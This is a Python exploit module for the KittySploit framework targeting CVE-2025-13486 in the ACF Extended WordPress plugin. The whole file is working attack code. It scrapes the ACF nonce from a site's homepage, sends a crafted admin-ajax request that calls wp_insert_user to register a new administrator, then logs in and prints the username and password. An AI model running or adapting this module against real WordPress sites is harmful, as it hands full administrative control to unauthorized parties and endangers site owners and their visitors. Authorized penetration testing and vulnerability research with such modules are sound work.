#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ACF Extended CVE-2025-13486 — wp_insert_user via render_form_ajax."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "ACF Extended CVE-2025-13486 admin user create",
        "description": (
            "CVE-2025-13486: abuses acfe/form/render_form_ajax with form[render]=wp_insert_user "
            "to register an administrator and output credentials; wp-login may set cookies on the module HTTP client only."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-13486"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-13486"],
        "tags": [
            "auxiliary", "wordpress", "acf-extended", "acfe", "privesc", "cve-2025-13486"],
        "agent": {
            "risk": "critical",
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)

    _NONCE = re.compile(r'acf\.data.*?"nonce":"([a-f0-9]+)"', re.S)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        m = self._NONCE.search(home.text or "") if home else None
        if not m:
            print_error("ACF nonce not found on homepage")
            return False
        user = f"ks{secrets.token_hex(4)}"
        pwd = secrets.token_urlsafe(12)
        email = f"{user}@example.test"
        data = (
            f"action=acfe/form/render_form_ajax&nonce={m.group(1)}"
            f"&form[render]=wp_insert_user&form[user_login]={user}"
            f"&form[user_pass]={pwd}&form[user_email]={email}&form[role]=administrator"
        )
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_success(f"Logged in as {user}")
            print_status(f"Password: {pwd}")
            return True
        print_error("Admin creation or login failed")
        return False
